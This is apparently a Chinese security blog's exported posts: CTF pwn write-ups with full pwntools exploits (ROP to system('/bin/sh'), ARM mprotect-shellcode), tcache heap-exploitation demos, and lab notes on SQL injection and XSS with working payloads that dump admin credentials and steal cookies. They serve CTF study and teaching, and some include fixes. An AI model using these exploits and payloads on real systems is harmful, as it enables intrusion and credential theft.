payload +=&quot; Host:&quot;+&quot;a&quot;*126 + &quot;#&quot; payload += &quot; ResearchField:&quot;+ &#39;a&#39;*126 +&quot;#&quot; payload +=&quot; ResearchField:&quot;+ &#39;a&#39;*2 + p64(0x6021a0) +&quot;#&quot; payload += &quot; Username: &quot; + p64(0xdeadbeef)*4 + &quot;#&quot; p.sendline(payload.ljust(8000,&#39;b&#39;)) p.recv() p.interactive() int程序的逻辑很简单，存在一个整数溢出。通过整数溢出可以造成栈溢出，就可以进行rop了。 这里我一开始比较困惑的是那个alloca函数，它通过ida反编译后参数很奇怪，我还以为进行了什么操作。直到我自己写了个测试alloca函数的程序，发现原来这个函数不在glibc库中，它由一些汇编语句构成，最终结果是将栈的空间增大，并返回一个内存指针。 测试程序： #include&lt;stdio.h&gt; #include&lt;stdlib.h&gt; int main() { int *a; a = alloca(16); return 0; } 拖进ida中看下 .text:000000000040054E ; 4: v3 = alloca(32LL); .text:000000000040054E mov rax, fs:28h .text:0000000000400557 mov [rbp+var_8], rax .text:000000000040055B xor eax, eax .text:000000000040055D mov eax, 10h .text:0000000000400562 sub rax, 1 .text:0000000000400566 add rax, 1Fh .text:000000000040056A mov esi, 10h .text:000000000040056F mov edx, 0 .text:0000000000400574 div rsi .text:0000000000400577 imul rax, 10h .text:000000000040057B sub rsp, rax .text:000000000040057E mov rax, rsp .text:0000000000400581 add rax, 0Fh .text:0000000000400585 shr rax, 4 .text:0000000000400589 shl rax, 4 .text:000000000040058D mov [rbp+var_10], rax .text:0000000000400591 mov eax, 0 对比题目的代码 .text:000000000040076D ; 13: v3 = alloca(32LL); .text:000000000040076D mov eax, 10h .text:0000000000400772 sub rax, 1 .text:0000000000400776 add rax, 1Bh .text:000000000040077A mov ecx, 10h .text:000000000040077F mov edx, 0 .text:0000000000400784 div rcx .text:0000000000400787 imul rax, 10h .text:000000000040078B sub rsp, rax .text:000000000040078E mov rax, rsp .text:0000000000400791 add rax, 0Fh .text:0000000000400795 shr rax, 4 .text:0000000000400799 ; 14: buf = (16 * ((&amp;v6 + 3) &gt;&gt; 4)); .text:0000000000400799 shl rax, 4 .text:000000000040079D mov [rbp+buf], rax 可以发现其实 v3 = alloca(32LL); 和buf = (16 * ((&amp;v6 + 3) &gt;&gt; 4));这两条反编译后的语句相当于 buf = alloca(32); 程序的漏洞点 它后面read函数读入数据的大小和alloca函数分配的大小是由我们输入控制的，所以可以控制它为一个很大的值，造成整数溢出，那么可以分配一个小空间，但是可以读取很多数据。那么就会造成栈溢出。 栈的大小要通过调试来得到，dest的地址为0x7ffd035211b0 dest与rbp的距离 所以dest + 12 距离返回地址的偏移为 0x80-12 + 8 = 124 栈的大小知道了，剩下的就是怎么进行rop利用。先泄露出libc地址，然后调用system函数来getshell。 exp: #!/usr/bin/env python from pwn import * p = process(&#39;./int&#39;) elf = ELF(&#39;./int&#39;) libc = elf.libc context.arch = elf.arch context.log_level=&#39;debug&#39; def sd(content): p.send(content) def sl(content): p.sendline(content) def rc(): return p.recv() def ru(content): return p.recvuntil(content) rc() #gdb.attach(p,&quot;b *0x0400824&quot;) pop_rdi = 0x00000000004008f3 payload = p32(0x6e696b53) + p32(0x1) + p32(0xffffffff) p.send(payload) payload = &#39;a&#39;*124 payload += p64(pop_rdi) payload += p64(elf.got[&#39;puts&#39;]) payload += p64(elf.plt[&#39;puts&#39;]) payload += p64(0x4005E0)# start p.send(payload) leak = u64(p.recv(6).ljust(8, &quot;\x00&quot;)) libc.address = leak - libc.symbols[&#39;puts&#39;] info(&quot;libc.address: {}&quot;.format(hex(libc.address))) payload = p32(0x6E696B53) + p32(1) + p32(0xffffffff) sd(payload) payload = &#39;a&#39;*124 payload += p64(pop_rdi) payload += p64(libc.search(&quot;/bin/sh\x00&quot;).next()) payload += p64(libc.symbols[&#39;system&#39;]) payload += p64(0xdeadbeef) sd(payload) p.interactive()]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入学习]]></title>
    <url>%2F2018%2F11%2F14%2F2018-11-14-SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[SQL学习笔记 SQL基础注释语句单行注释： 以“#”号开头,直到该行行尾,全部都是注释内容 以“– ”号开头,直到该行行尾,全部都是注释内容。（“– ”与注释内容之间要加有空格） 多行注释： /……/，“/”用于注释文字的开头，“/”用于注释文字的结尾。 常用函数 user()：当前数据库用户 database()：当前数据库名 version()：当前使用的数据库版本 @@datadir：数据库存储数据路径 concat()：联合数据，用于联合两条数据结果。如 concat(username,0x3a,password) group_concat()：和 concat() 类似，如 group_concat(DISTINCT+user,0x3a,password)，用于把多条数据一次注入出来 concat_ws()：用法类似 hex() 和 unhex()：用于 hex 编码解码 load_file()：以文本方式读取文件，在 Windows 中，路径设置为 \\ select xxoo into outfile &#39;路径&#39;：权限较高时可直接写文件 MYSQL常规注入步骤爆数据库名 select schema_name from information_schema.schemata 爆表名 select table_name from information_schema.tables where table_schema=&#39;&#39; 爆列名 select column_name from information_schema.columns where table_name=&#39;&#39; 爆出某列的内容 Select xxx from xxx sqli-labs一个练习SQL注入的靶场 writeupLess-1payload 尝试id=1&#39;报错，尝试id=1&#39; and 1=1 %23 不报错 %23是#字符 说明这个是个单引号闭合 最终payload为http://localhost/sqli/Less-1/?id=1’ and 1=1 %23 练习下MYSQL的常规注入操作 爆破字段数 http://localhost/sqli/Less-1/?id=1’ order by 4 %23 爆数据库名 http://localhost/sqli/Less-1/?id=1’union select 1,group_concat(schema_name),3 from information_schema.schemata%23 爆表名 http://localhost/sqli/Less-1/?id=1’union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = &quot;test&quot; %23 爆列名 http://localhost/sqli/Less-1/?id=1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name = &quot;hack&quot; %23 爆内容 http://localhost/sqli/Less-1/?id=1’ union select group_concat(id),group_concat(user),group_concat(pwd) from hack %23 Less-2]]></content>
      <tags>
        <tag>web</tag>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入和XSS的简单学习笔记]]></title>
    <url>%2F2018%2F11%2F13%2F2018-11-13-SQL%E6%B3%A8%E5%85%A5%E5%92%8CXSS%E7%9A%84%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[混子pwn手来学点web的东西了，网络攻防课程要求做的作业 SQL注入原理 将SQL 代码插入或添加到应用（用户）的输入参数中，之后再讲这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。 形成原因： web开发人员没有在将从web表单、cookie、输入参数等收到的值传给SQL查询前进行检查 漏洞复现平台 ： NPMserv 目标：NPMserv 中的一个政府网站 (本地搭的一个环境) 判断注入点 http://127.0.0.1/info_show.php?info_id=140 and 1=1 有回显 http://127.0.0.1/info_show.php?info_id=140 and 1=2 无回显 爆破字段数量 http://127.0.0.1/info_show.php?info_id=140 order by 5 这里数量，试了1到5都没问题，而6的话就会无回显，所以字段数量为5 判断可回显字段 http://127.0.0.1/info_show.php?info_id=140 union select 1,2,3,4,5 这里发现只有2，3字段是可以回显的 爆出敏感信息 http://127.0.0.1/info_show.php?info_id=140 union select 1,user(),database(),4,5 爆出了数据库用户名和数据库名，分别为root@localhost 和 govcn http://127.0.0.1/info_show.php?info_id=140 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema=&quot;govcn&quot; 爆出govcn数据库中包含的数据表，分别为admin，index_dy，index_info，index_intro，jgsz，ldjj group_concat函数用于把多条数据一次注出 爆admin表的列名 http://127.0.0.1/info_show.php?info_id=140 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_name=&#39;admin&#39; 爆出admin表中的列名为username,password 爆用户和密码 http://127.0.0.1/info_show.php?info_id=140 union select 1,unhex(hex(username)),unhex(hex(password)),4,5 from admin 用unhex(hex())是为了解决网站编码不一致导致没有回显的问题 用户名为admin，密码为：21232f297a57a5a743894a0e4a801fc3 这个是md5加密过的，拿去解密一下，解出来的内容为 admin。所以用户名为admin，密码为admin 利用注出的用户密码成功登入后台 至此，一个简单的SQL注入漏洞 就复现完了 SQL注入的防护手段 1对客户端提交的数据进行严格的校验，校验可以考虑数据类型，字符长度或者正则表达式等方式。 2.对客户端提交的数据进行转义，例如将” ‘ “转义为” ‘ “。 3.采用预编译绑定变量的SQL语句而不是直接拼接SQL语句。 4.避免在生产环境中，直接输出错误信息，因为这些错误信息有可能被攻击者利用。 5.严格执行数据库账号权限管理。 6.对用户敏感信息特别是密码做严格加密处理。 漏洞修复因为这个平台代码写的比较shi，本来想加上SQL预编译的，但是发现要改好多东西，所以就只针对漏洞点进行，修改。定位漏洞点，在info_show.php中 可以发现它直接用GET请求获得的参数进行SQL查询，对传入的参数并没有进行检查。所以我在这加入了一个检查，判断传入的参数是否为数字，如果不为数字，就强制转换成数字。 然后就ok了，补完洞了。再测试下，发现已经注入不了了。(也可能是我太菜了，才注不了，但是不管了，假装补上了) XSS跨站脚本攻击原理 攻击者在被攻击的Web服务器网页中嵌入恶意脚本，通常是用JavaScript编写的恶意代码，当用户使用浏览器访问被嵌入恶意代码的网页时，恶意代码将会在用户的浏览器上执行。 类型 反射型 XSS 反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。 持久型 XSS 此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。 DOM XSS DOM-based XSS漏洞是基于文档对象模型Document Objeet Model 的一种漏洞。DOM是一个与平台、编程语言无关的借口，它允许程序或脚本动态的访问或者更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些事用户可以操作的.客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格的确认，就会产生DOM-based XSS漏洞。 漏洞复现平台 ： NPMserv 目标：NPMserv 中的博客网站 (本地搭的一个环境) 寻找漏洞点，这些博客的网站，xss一般存在于留言板中。而这个博客系统中每篇文章下都可以留言，并且有留言本。 先测试下文章的留言功能 发现输入的js代码被执行了，所以这里存在一个xss漏洞，并且是个反射型的xss漏洞 然后测试下留言本，很明显，这里也存在XSS漏洞，并且这个是个存储型的XSS漏洞，我输入的语句直接插入到网站上，只要用户访问了这个网站，那么我输入的代码就会被执行。 这个可以拿来做很多事情，比如 Cookie窃取 会话劫持 网页挂马 DOS和DDOS XSS蠕虫 简单演示下 Cookie窃取 &lt;script&gt;alert(document.cookie)&lt;/script&gt; 嵌入网页 &lt;iframe src= http://www.baidu.com width=400 height=300&gt;&lt;/iframe&gt; &lt;iframe src= http://www.baidu.com width=0 height=0 frameborder=0&gt;&lt;/iframe&gt; 可以通过设置嵌入网页的高宽来隐藏它 页面跳转 &lt;script&gt;location=&quot;http://www.baidu.com&quot;&lt;/script&gt; #直接劫持页面 防御手段XSS攻击防御的核心思想就是对输入输出进行过滤和数据转义 过滤： 过滤不安全的标签，如script, style, link, iframe, frame。 过滤字符串中的 反斜杠 转义 针对&lt;、&gt;、/、’、”、&amp;五个字符进行实体化转义。 文章评论漏洞 漏洞修复：将$comment[‘content’] 的值经过htmlspecialchars函数处理，htmlspecialchars()函数可以把&amp; （和号）、“（双引号）、‘（单引号）、&lt;（小于）、&gt;（大于）这些敏感符号都转换为html实体。 测试，XSS漏洞修复了 留言版漏洞，这是一个存储型XSS漏洞，审查代码，定位漏洞点 可以发现它对提交的变量没有进行过滤就插入数据库了 漏洞修补：在add函数里加入htmlspecialchars函数，对传入的变量进行转义 然后就搞定了，之前的XSS漏洞不可以用了 reference： SQL注入攻击方式及防御方法，手把手入门白帽子 （二) CTF-Wiki]]></content>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[arm-pwn环境搭建]]></title>
    <url>%2F2018%2F11%2F05%2F2018-11-5-arm-pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[最近打的比赛，做arm-pwn发现自己环境有点问题，就像新搭一个基于deepin系统的环境，下面记录下搭环境的过程 镜像 先装好deepin虚拟机，然后开始配环境 基本环境的安装 gdb-multiarch, git , vim, gdb ,binfmt 用来 识别文件格式 sudo apt-get update sudo apt-get install git gdb gdb-multiarch vim sudo apt-get install &quot;binfmt*&quot; 安装gef wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py echo source ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit 安装pip，pwntools wget https://bootstrap.pypa.io/get-pip.py sudo python get-pip.py sudo apt-get install python-dev sudo pip install pwntools 安装qume sudo apt-get install qemu-user 然后环境基本就搞定了，剩下的共享库，需要安装什么就安装什么，我另一篇博客有讲过，这里就不讲了。 reference: D4rk3r 师傅的博客 M4X师傅]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ARM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【上海市大学生网络安全大赛】pwn复现]]></title>
    <url>%2F2018%2F11%2F05%2F2018-11-5-%E3%80%90%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E3%80%91baby_arm%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[baby_arm题如其名，这是一道arm下的pwn，用file查看了下文件信息 zs0zrc@zs0zrc-PC:~/pwn/babyarm$ file arm_pwn arm_pwn: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=e988eaee79fd41139699d813eac0c375dbddba43, stripped 这是一道aarch64的pwn题，我之前ubuntu的环境有点小问题，所以我配了一个deepin的环境搭建教程 安装下共享库 zs0zrc@zs0zrc-PC:~/pwn/babyarm$ apt-cache search &quot;libc6&quot; | grep arm libc6-arm64-cross - GNU C Library: Shared libraries (for cross-compiling) libc6-armel-cross - GNU C Library: Shared libraries (for cross-compiling) libc6-armhf-cross - GNU C Library: Shared libraries (for cross-compiling) libc6-dev-arm64-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling) libc6-dev-armel-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling) libc6-dev-armhf-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling) zs0zrc@zs0zrc-PC:~/pwn/babyarm$ sudo apt-get install libc6-arm64-cross 用ida反编译了下文件，发现漏洞点很明显，就是一个栈溢出 __int64 sub_400818() { sub_400760(); write(1, &quot;Name:&quot;, 5uLL); read(0, &amp;unk_411068, 0x200uLL); sub_4007F0(); return 0LL; } ssize_t sub_4007F0() { __int64 v1; // [xsp+10h] [xbp+10h] return read(0, &amp;v1, 0x200uLL); //stack overflow } 程序先向bss段写入内容，然后再读取一个字符串，很明显这应该是用rop来做，但是我arm64的rop不是很会，arm64的汇编不是很懂，找不到gadget，就 …….. 这里看了大佬的writeup，发现是用rop做，先利用rop执行mprotect函数，设置bss段为可执行，往bss段写入shellcode，然后去执行shellcode来getshell 这里找的gadget类似于万用gadget 先学习下amd64常用汇编指令 MOV X1，X0 ;将寄存器X0的值传送到寄存器X1 ADD X0，X1，X2 ;寄存器X1和X2的值相加后传送到X0 SUB X0，X1，X2 ;寄存器X1和X2的值相减后传送到X0 AND X0，X0，#0xF ; X0的值与0xF相位与后的值传送到X0 ORR X0，X0，#9 ; X0的值与9相位或后的值传送到X0 EOR X0，X0，#0xF ; X0的值与0xF相异或后的值传送到X0 LDR X5，[X6，#0x08] ；X6寄存器加0x08的和的地址值内的数据传送到X5 STR X0, [SP, #0x8] ；X0寄存器的数据传送到SP+0x8地址值指向的存储空间 STP x29, x30, [sp, #0x10] ;入栈指令 LDP x29, x30, [sp, #0x10] ;出栈指令 CBZ ;比较（Compare），如果结果为零（Zero）就转移（只能跳到后面的指令） CBNZ ;比较，如果结果非零（Non Zero）就转移（只能跳到后面的指令） CMP ;比较指令，相当于SUBS，影响程序状态寄存器CPSR B/BL ;绝对跳转#imm， 返回地址保存到LR（X30） RET ;子程序返回指令，返回地址默认保存在LR（X30） 然后分析下这个gadget，通过loc_4008CC 函数，可以控制x19,x20,x21,x22,x23,x24,x29和x30寄存器的内容，而x30寄存器存储着返回地址，通过loc_4008AC函数，可以控制w0,x1,x2,x3寄存器的内容，并且可以执行call x3 loc_4008AC ; CODE XREF: sub_400868+60↓j LDR X3, [X21,X19,LSL#3] ;将x21寄存器的地址指向的内容赋给x3寄存器 MOV X2, X22 ;将x22寄存器的内容赋给x2 MOV X1, X23 ;将x23寄存器的内容赋给x1 MOV W0, W24 ;将W24寄存器的内容赋给W0 ADD X19, X19, #1 ;x19寄存器加一 BLR X3 ；跳转到x3寄存器指向的地址 CMP X19, X20 ；比较x19和x20是否相等 B.NE loc_4008AC ；如果不相等，就跳回loc_4008AC继续执行 loc_4008CC ; CODE XREF: sub_400868+3C↑j LDP X19, X20, [SP,#0x10] ;将sp+0x10,sp+0x18处的内容给x19,x20 LDP X21, X22, [SP,#0x20] ;将sp+0x20,sp+0x28处的内容给x21,x22 LDP X23, X24, [SP,#0x30] ;将sp+0x30,sp+0x38处的内容给x23,x24 LDP X29, X30, [SP],#0x40 ;将sp,sp+0x8处的内容给x29,x30 RET 布置好的栈如下，在执行完loc_4008CC 函数后，x30为loc_4008AC 的地址，所以程序会跳转到loc_4008AC 函数，会将x21寄存器的地址指向的内容赋给x3寄存器，然后将对应的参数放入x0,x1,x2寄存器中，接着会执行blr x3语句，这相当于 call x3，所以就会调用构造好的mprotect(0x411000,0x1000,0x5)函数，调用完mprotect函数后会将继续向下执行，比较x19和x20是否相等，这里提前构造好，使它们相等，然后继续向下执行。执行一连串的ldp指令后，将shellcode的地址赋给x30,那么最后就会ret到shellcode处去执行它。 00:0000│ sp 0x40007ffe40 ◂— 0x0 --&gt; x29 01:0008│ 0x40007ffe48 —▸ 0x4008ac ◂— ldr x3, [x21, x19, lsl #3] --&gt; x30 02:0010│ 0x40007ffe50 ◂— 0x0 --&gt; x19 03:0018│ 0x40007ffe58 ◂— 0x1 --&gt; x20 04:0020│ 0x40007ffe60 —▸ 0x411168 —▸ 0x400600 (mprotect@plt) --&gt; x21 --&gt;x3 05:0028│ 0x40007ffe68 ◂— 0x5 --&gt; x22 --&gt;x2 06:0030│ 0x40007ffe70 ◂— 0x1000 --&gt;x23 --&gt;x1 07:0038│ 0x40007ffe78 —▸ 0x411000 --&gt;x24--&gt;w0 08:0040│ 0x40007ffe80 ◂— 0x0 09:0048│ 0x40007ffe88 —▸ 0x411068 --&gt;下一个x30,shellcode的地址 0a:0050│ 0x40007ffe90 ◂— 0xdeadbeef *6 ........... 这里用pwntools生成aarch64的shellcode会报错 解决方法(Ubuntu下) $ sudo apt-get install software-properties-common $ sudo apt-add-repository ppa:pwntools/binutils $ sudo apt-get update $ sudo apt-get install binutils-aarch64-linux-gnu exp: #!/usr/bin/env python from pwn import * local=0 debug = 0 if local: p = remote(&quot;106.75.126.171&quot;,&quot;33865&quot;) elif debug: p = process([&quot;qemu-aarch64&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;/usr/aarch64-linux-gnu&quot;, &quot;pwn&quot;]) else: p = process([&quot;qemu-aarch64&quot;, &quot;-L&quot;, &quot;/usr/aarch64-linux-gnu&quot;, &quot;pwn&quot;]) elf = ELF(&quot;pwn&quot;) context.binary = &quot;pwn&quot; context.log_level = &quot;debug&quot; def sd(content): p.send(content) def sl(content): p.sendline(content) def rc(): return p.recv() def ru(content): return p.recvuntil(content) buf = asm(shellcraft.aarch64.sh()) buf = buf.ljust(0x100,&#39;\x00&#39;) buf += p64(0x400600) #这里是存放mprotect函数的地址 size = 72 gadget1 = 0x4008CC gadget2 = 0x4008AC shellcode_add = 0x411068 mprotect_add = 0x411168 payload = cyclic(72) + flat([gadget1 , 0 , gadget2 , 0 , 1 , mprotect_add , 5 , 0x1000 , 0x411000 , 0 , shellcode_add] , [0xdeadbeef]*6) rc() sl(buf) sl(payload) p.interactive() momo_serve]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ARM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tcache下的堆利用的学习]]></title>
    <url>%2F2018%2F10%2F30%2F2018-10-30-tcache%E4%B8%8B%E7%9A%84%E5%A0%86%E5%88%A9%E7%94%A8%E7%9A%84%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[最近做国际赛的题，遇到了tcache下的堆利用，之前没有接触过tcache机制，所以就来学习一下，主要是围绕howtoheap来学习，做下笔记。 tcache机制是glibc-2.26新增的机制，主要是用来提升堆管理的性能，但是它的安全机制几乎没有….所以搞事就容易很多了，混子pwn手的福音 基础知识tcache的两个新增的结构体 typedef struct tcache_entry //tcache_entry 是用来链接chunk的结构体，*next指向下一个chunk的 { //user data struct tcache_entry *next; } tcache_entry; typedef struct tcache_perthread_struct //tcache的管理结构，一共有64项entries { char counts[TCACHE_MAX_BINS]; tcache_entry *entries[TCACHE_MAX_BINS]; } tcache_perthread_struct; 一些新增的宏 //tcache新增的宏 #if USE_TCACHE /* We want 64 entries. This is an arbitrary limit, which tunables can reduce. */ # define TCACHE_MAX_BINS 64 //tcache entries的数量 # define MAX_TCACHE_SIZE tidx2usize (TCACHE_MAX_BINS-1) //tcache的最大大小 /* Only used to pre-fill the tunables. */ # define tidx2usize(idx) (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ) /* When &quot;x&quot; is from chunksize(). */ # define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT) /* When &quot;x&quot; is a user-provided size. */ # define usize2tidx(x) csize2tidx (request2size (x)) /* This is another arbitrary limit, which tunables can change. Each tcache bin will hold at most this number of chunks. */ # define TCACHE_FILL_COUNT 7 //一个entry最多可以有7个chunk #endif 源码分析我就不写了，懒~，大佬们写的都很详细了 M4X大佬博客 P4nda大佬 tcache_poisoning通过覆盖tcache_entry中的 next指针，实现任意地址分配。因为tcache_get函数没有安全性检查机制 static __always_inline void * tcache_get (size_t tc_idx) { tcache_entry *e = tcache-&gt;entries[tc_idx]; assert (tc_idx &lt; TCACHE_MAX_BINS); assert (tcache-&gt;entries[tc_idx] &gt; 0); tcache-&gt;entries[tc_idx] = e-&gt;next;//基本什么检查都没有 --(tcache-&gt;counts[tc_idx]); return (void *) e; } 源码： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;stdint.h&gt; int main() { size_t stack_var; fprintf(stderr, &quot;The address we want malloc() to return is %p.\n&quot;, (char *)&amp;stack_var); fprintf(stderr, &quot;Allocating 1 buffer.\n&quot;); intptr_t *a = malloc(128); fprintf(stderr, &quot;malloc(128): %p\n&quot;, a); fprintf(stderr, &quot;Freeing the buffer...\n&quot;); free(a); fprintf(stderr, &quot;Now the tcache list has [ %p ].\n&quot;, a); fprintf(stderr, &quot;We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n&quot; &quot;to point to the location to control (%p).\n&quot;, sizeof(intptr_t), a, &amp;stack_var); a[0] = (intptr_t)&amp;stack_var; fprintf(stderr, &quot;1st malloc(128): %p\n&quot;, malloc(128)); fprintf(stderr, &quot;Now the tcache list has [ %p ].\n&quot;, &amp;stack_var); intptr_t *b = malloc(128); fprintf(stderr, &quot;2nd malloc(128): %p\n&quot;, b); fprintf(stderr, &quot;We got the control\n&quot;); return 0; } 运行结果： zs0zrc@ubuntu:~/pwn/how2heap/glibc_2.26$ ./tcache_poisoning The address we want malloc() to return is 0x7ffe8a1508e0. Allocating 1 buffer. malloc(128): 0x562bb17cd260 Freeing the buffer... Now the tcache list has [ 0x562bb17cd260 ]. We overwrite the first 8 bytes (fd/next pointer) of the data at 0x562bb17cd260 to point to the location to control (0x7ffe8a1508e0). 1st malloc(128): 0x562bb17cd260 Now the tcache list has [ 0x7ffe8a1508e0 ]. 2nd malloc(128): 0x7ffe8a1508e0 We got the control 这个程序先分配了一个大小128的chunk，然后将它free掉。此时这个chunk会被放入tcache中，然后修改它的next字段，修改为一个栈上变量的地址。最后在分配两次128大小的chunk，就可以控制栈上的内容了。 tcache_dup这个这是效果和double free差不多，但是比glibc_2.25版本简单，直接free两次就好了，因为tcache_put也没什么检查机制 static __always_inline void tcache_put (mchunkptr chunk, size_t tc_idx) { tcache_entry *e = (tcache_entry *) chunk2mem (chunk); assert (tc_idx &lt; TCACHE_MAX_BINS); e-&gt;next = tcache-&gt;entries[tc_idx]; tcache-&gt;entries[tc_idx] = e; ++(tcache-&gt;counts[tc_idx]); } how2heap例子 #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { fprintf(stderr, &quot;This file demonstrates a simple double-free attack with tcache.\n&quot;); fprintf(stderr, &quot;Allocating buffer.\n&quot;); int *a = malloc(8); fprintf(stderr, &quot;malloc(8): %p\n&quot;, a); fprintf(stderr, &quot;Freeing twice...\n&quot;); free(a); free(a); fprintf(stderr, &quot;Now the free list has [ %p, %p ].\n&quot;, a, a); fprintf(stderr, &quot;Next allocated buffers will be same: [ %p, %p ].\n&quot;, malloc(8), malloc(8)); return 0; } 运行结果: zs0zrc@ubuntu:~/pwn/how2heap/glibc_2.26$ ./tcache_dup This file demonstrates a simple double-free attack with tcache. Allocating buffer. malloc(8): 0x5595e067f260 Freeing twice... Now the free list has [ 0x5595e067f260, 0x5595e067f260 ]. Next allocated buffers will be same: [ 0x5595e067f260, 0x5595e067f260 ]. free两次后tcache的情况 house_of_spirit这个主要是由于tcache_put函数没有对chunk的前后chunk的有效性进行检查，所以只要构造好本块对齐的chunk就可以free掉放入tcache中。 前提：(x64位下) ps：free掉的地址是伪造的chunk的user_data地址，和之前还是有点不同的 伪造的size&lt;= 0x410 malloc的大小 &lt;= 0x408 源码： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; int main() { unsigned long long *a; //pointer that will be overwritten unsigned long long fake_chunks[10]; //fake chunk region malloc(1);//init heap fake_chunks[1] = 0x40; // this is the size fprintf(stderr, &quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;, &amp;fake_chunks[1]); fprintf(stderr, &quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;); a = &amp;fake_chunks[2]; fprintf(stderr, &quot;Freeing the overwritten pointer.\n&quot;); free(a); fprintf(stderr, &quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;, &amp;fake_chunks[1], &amp;fake_chunks[2]); fprintf(stderr, &quot;malloc(0x30): %p\n&quot;, malloc(0x30)); } free掉伪造的chunk后堆的情况 reference: M4X’s blog P4nda CTF-WIKI tcache_source_code]]></content>
      <categories>
        <category>Heap_Exploitation</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>housetoheap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BSides Delhi CTF 2018 writeup]]></title>
    <url>%2F2018%2F10%2F27%2F2018-10-27-BSides-Delhi-CTF-2018-writeup%2F</url>
    <content type="text"><![CDATA[easypeasy防护机制： ☁ easy checksec easypeasy [*] &#39;/home/zs0zrc/pwn/ BSides/easy/easypeasy&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 简单的运行了下，好像是让我们输入寄存器的值，一直循环输入 简单逆向下，程序主要逻辑在child函数中。 void __noreturn child() { __int64 buf[7]; // [rsp+0h] [rbp-40h] unsigned __int64 v1; // [rsp+38h] [rbp-8h] v1 = __readfsqword(0x28u); signal(14, (__sighandler_t)handler); while ( 1 ) { do { get_obj(buf); obj = buf[0]; qword_6010A8 = buf[1]; qword_6010B0 = buf[2]; qword_6010B8 = buf[3]; qword_6010C0 = buf[4]; qword_6010C8 = buf[5]; qword_6010D0 = buf[6]; } while ( (unsigned int)validate_syscall_obj(buf[0]) ); raise(14); } } __int64 __fastcall get_obj(_QWORD *buf) { printf(&quot;RAX: &quot;); *buf = get_ll(); printf(&quot;RDI: &quot;); buf[1] = get_ll(); printf(&quot;RSI: &quot;); buf[2] = get_ll(); printf(&quot;RDX: &quot;); buf[3] = get_ll(); printf(&quot;RCX: &quot;); buf[4] = get_ll(); printf(&quot;R8: &quot;); buf[5] = get_ll(); printf(&quot;R9: &quot;); buf[6] = get_ll(); return 0LL; } singal()函数声明void (signal(int sig, void (func)(int)))(int) ，第一个参数为要处理的信号，第二个参数为处理方法 raise()函数声明int raise(int sig) 这里参数为要发送的信号码，这个函数会促使生成信号sig 这里用signal函数给信号14也就是SIGALRM信号 设置了一个处理方法，然后循环读取寄存器的值，将这些值存入bss段上的变量中，每读取完一次后调用一次validate_syscall_obj函数，如果validate_syscall_obj函数返回值为0，就调用raise(14)函数,生成信号SIGALRM。然后就会调用handler函数，否则就进行下一次循环。如果想调用handler函数，那么rax的值就必须为1，2，3，60这四个数中的一个，或者是等30秒，程序调用alarm函数。 贴下linux支持的信号表： Linux支持的信号列表如下。很多信号是与机器的体系结构相关的 信号 信号值 默认处理动作 发出信号的原因 SIGHUP 